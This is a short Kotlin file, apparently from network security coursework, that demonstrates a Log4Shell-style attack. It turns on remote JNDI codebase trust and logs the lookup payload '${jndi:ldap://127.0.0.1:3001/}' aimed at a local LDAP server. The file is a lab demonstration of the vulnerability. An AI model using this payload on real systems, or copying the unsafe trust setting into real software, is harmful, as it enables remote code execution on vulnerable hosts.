package com.github.thechenderson.advancednetworksecuritycoursework

fun main() {
//    embeddedServer(Netty, port = 8080, host = "0.0.0.0") {
//        configureRouting()
//    }.start(wait = true)
  System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true")
  val attackString = "\${jndi:ldap://127.0.0.1:3001/}"
  Logger.log(attackString)
}